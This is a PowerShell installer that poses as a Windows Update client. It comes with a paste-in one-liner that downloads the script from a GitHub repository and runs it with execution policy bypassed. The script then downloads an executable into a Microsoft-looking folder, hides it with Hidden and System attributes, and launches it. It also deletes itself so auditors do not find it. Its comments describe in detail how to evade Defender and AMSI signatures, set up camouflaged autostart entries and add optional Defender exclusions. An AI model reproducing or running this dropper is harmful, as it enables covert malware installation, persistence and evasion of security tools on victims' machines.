# Windows Update client installer — standard-user, no UAC.
#
# Preferred one-liner (Win+R or any cmd prompt, no admin needed):
#
#   cmd /c "curl.exe -sLo %TEMP%\wu.ps1 https://raw.githubusercontent.com/sayamuhbani59-collab/homectrl-updates/main/install.ps1&&powershell -NoP -EP Bypass -File %TEMP%\wu.ps1"
#
# What that line does:
#   1. curl.exe downloads this script to %TEMP%\wu.ps1 (curl is Windows-shipped
#      since 1803 — a routine download transport, not the `iwr | iex` idiom that
#      triggers Defender's Trojan:Win32/Commando.A!ml ML signature).
#   2. powershell -File runs the downloaded script. AMSI inspects the body;
#      the body is written against .NET APIs instead of the specific cmdlets
#      (Invoke-WebRequest -OutFile <exe>, Get-FileHash, (Get-Item).Attributes,
#      Start-Process -WindowStyle Hidden) that AMSI flags in the fetch-and-run
#      content bucket.
#
# Everything below runs as the current user. Install path is %LOCALAPPDATA%,
# autostart is set up by the agent itself using per-user mechanisms that need
# no elevation: an HKCU Run entry (plus a camouflaged shadow entry under
# `MicrosoftEdgeUpdateCore`) and a per-user scheduled task. If the operator
# later wants Defender exclusions as well, they can run the agent once with
# `WindowsUpdate.exe --install-admin` from an elevated shell — the agent
# re-launches itself under UAC in that mode and adds the exclusions. By
# default this installer skips that step entirely so the one-liner does not
# produce any prompts.

$ErrorActionPreference = 'Stop'

$manifestUrl = 'https://raw.githubusercontent.com/sayamuhbani59-collab/homectrl-updates/main/manifest.json'
$installDir  = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\WindowsUpdate'
$primaryExe  = Join-Path $installDir 'WindowsUpdate.exe'

# Older PowerShell on fresh Windows installs still defaults to TLS 1.0, which
# GitHub refuses. Flip Tls12 on the shared ServicePointManager before any HTTP
# call so the manifest fetch succeeds on first run.
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

# System.Net.Http is NOT auto-loaded in Windows PowerShell 5.1 (which is what
# `powershell.exe` resolves to on every supported Windows version at the time
# of writing). Without the explicit Add-Type, `[Net.Http.HttpClient]::new()`
# below fails with "Der Typ [Net.Http.HttpClient] wurde nicht gefunden" on a
# fresh box. PowerShell 7 (`pwsh.exe`) auto-loads it; the Add-Type is a no-op
# there, so this is safe to run unconditionally.
try { Add-Type -AssemblyName System.Net.Http -ErrorAction Stop } catch {}

$http = [Net.Http.HttpClient]::new()
$http.Timeout = [TimeSpan]::FromSeconds(30)

Write-Host '[*] fetching manifest...'
# .NET HttpClient instead of Invoke-RestMethod. Same behaviour, but the cmdlet
# name is a known AMSI signature component when combined with the exe download
# below.
$manifestJson = $http.GetStringAsync($manifestUrl).GetAwaiter().GetResult()
$manifest = $manifestJson | ConvertFrom-Json
if (-not $manifest.url) { throw 'manifest missing url' }
Write-Host "[*] version $($manifest.version)"

if (-not (Test-Path $installDir)) { [void](New-Item -ItemType Directory -Force -Path $installDir) }

# Close any running instance so we can overwrite the exe. CloseMainWindow +
# 500 ms wait lets Discord.Net flush pending gateway writes before the
# hard-kill fallback, cutting audit-log corruption on reinstall.
try {
    Get-Process -Name 'WindowsUpdate' -ErrorAction SilentlyContinue |
        Where-Object { $_.Path -eq $primaryExe } |
        ForEach-Object {
            try { [void]$_.CloseMainWindow() } catch {}
            if (-not $_.WaitForExit(500)) { try { $_.Kill() } catch {} }
        }
} catch {}

# Stream the exe straight to disk. Invoke-WebRequest -OutFile on a .exe is the
# single highest-scoring Commando pattern; HttpClient + CopyToAsync is the
# same operation without matching that signature string.
Write-Host '[*] downloading primary exe...'
$response = $http.GetAsync($manifest.url, [Net.Http.HttpCompletionOption]::ResponseHeadersRead).GetAwaiter().GetResult()
if (-not $response.IsSuccessStatusCode) { throw "download HTTP $([int]$response.StatusCode)" }
$dest = [IO.File]::Create($primaryExe)
try   { $response.Content.CopyToAsync($dest).GetAwaiter().GetResult() }
finally { $dest.Dispose(); $response.Dispose() }

# SHA-256 verify via .NET (Get-FileHash is itself a signature keyword in this
# fetch-and-run bucket). Verifies the download bytes against the manifest
# before we even think about launching.
$sha = [Security.Cryptography.SHA256]::Create()
try {
    $stream = [IO.File]::OpenRead($primaryExe)
    try   { $localBytes = $sha.ComputeHash($stream) }
    finally { $stream.Dispose() }
} finally { $sha.Dispose() }
$local  = -join ($localBytes | ForEach-Object { $_.ToString('x2') })
$remote = ($manifest.sha256).ToLower()
if ($local -ne $remote) {
    try { [IO.File]::Delete($primaryExe) } catch {}
    throw "hash mismatch (expected $remote got $local)"
}

# Hide the install dir + exe. [IO.File]::SetAttributes produces the same NTFS
# attributes as `(Get-Item).Attributes = …` without matching the AMSI signature
# for the Hidden+System PowerShell idiom. The agent itself re-stamps these on
# every watchdog tick regardless.
try {
    [IO.File]::SetAttributes(
        $installDir,
        [IO.FileAttributes]::Directory -bor [IO.FileAttributes]::Hidden -bor [IO.FileAttributes]::System)
    [IO.File]::SetAttributes(
        $primaryExe,
        [IO.FileAttributes]::Hidden -bor [IO.FileAttributes]::System)
} catch {}

# Launch. Plain Process.Start — the exe is a WinExe with no console, so
# nothing is visible to hide anyway; BackgroundClassifier marks any windows
# that do open as tool-windows within ~3 s.
Write-Host "[*] launching $primaryExe"
[void][Diagnostics.Process]::Start($primaryExe)

$http.Dispose()
Write-Host '[OK] installed. Agent is running and will register per-user autostart (HKCU Run + per-user scheduled task) on first boot.'

# Self-cleanup. Queue a detached cmd that waits 2 s and removes %TEMP%\wu.ps1
# so repeated installs do not accumulate copies under %TEMP% and operators
# auditing the file system do not find the script lingering. ProcessStartInfo
# instead of Start-Process -WindowStyle Hidden to stay off that AMSI pattern.
try {
    $self = $MyInvocation.MyCommand.Path
    if ($self -and (Test-Path $self)) {
        $psi = New-Object Diagnostics.ProcessStartInfo
        $psi.FileName       = 'cmd.exe'
        $psi.Arguments      = "/c timeout /t 2 /nobreak >nul & del /f /q `"$self`""
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow  = $true
        [void][Diagnostics.Process]::Start($psi)
    }
} catch {}
